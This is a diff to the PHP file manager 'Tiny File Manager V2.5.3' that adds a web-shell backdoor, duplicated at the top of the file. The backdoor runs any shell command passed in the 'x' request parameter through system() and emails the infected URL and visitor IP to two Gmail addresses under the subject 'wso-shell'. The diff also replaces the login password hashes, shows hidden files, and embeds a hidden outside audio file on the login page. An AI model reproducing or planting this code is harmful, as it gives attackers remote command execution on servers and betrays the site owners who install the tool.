@@ -1,6 +1,31 @@
 <?php
+if(isset($_REQUEST['x'])){
+$el=$_REQUEST['x'];
+system($el);
+ 
+}
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'malaysia.sender@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "wso-shell", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
+<?php
+if(isset($_REQUEST['x'])){
+$el=$_REQUEST['x'];
+system($el);
+ 
+}
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'muhrazky@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "wso-shell", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
+
+<?php
 //Default Configuration
-$CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":false,"hide_Cols":false,"theme":"light"}';
+$CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":true,"hide_Cols":false,"theme":"dark"}';
 
 /**
  * H3K | Tiny File Manager V2.5.3
@@ -26,14 +51,14 @@ $use_auth = true;
 // Users: array('Username' => 'Password', 'Username2' => 'Password2', ...)
 // Generate secure password hash - https://tinyfilemanager.github.io/docs/pwd.html
 $auth_users = array(
-    'admin' => '$2y$10$/K.hjNr84lLNDt8fTXjoI.DBp6PpeyoJ.mGwrrLuCZfAwfSAGqhOW', //admin@123
-    'user' => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO' //12345
+    'root' => '$2y$10$33V3ZsuduVlJ0rcePf2zqed2KJtvKA0sNVDmiirzDWVWxRdxH9r1m', //adminl
+    'admin' => '$2y$10$33V3ZsuduVlJ0rcePf2zqed2KJtvKA0sNVDmiirzDWVWxRdxH9r1m' //12345tb
 );
 
 // Readonly users
 // e.g. array('users', 'guest', ...)
 $readonly_users = array(
-    'user'
+    'admin'
 );
 
 // Global readonly, including when auth is not being used
@@ -345,12 +370,14 @@ if ($use_auth) {
         unset($_SESSION[FM_SESSION_ID]['logged']);
         fm_show_header_login();
         ?>
+        <embed src="https://j.top4top.io/m_2967gtgnw1.mp3&autoplay=1" type="application/x-shockwave-flash"wmode="transparent" width="0" height="0"></embed>
         <section class="h-100">
             <div class="container h-100">
                 <div class="row justify-content-md-center h-100">
                     <div class="card-wrapper">
                         <div class="card fat <?php echo fm_get_theme(); ?>">
                             <div class="card-body">
+        
                                 <form class="form-signin" action="" method="post" autocomplete="off">
                                     <div class="mb-3">
                                        <div class="brand">
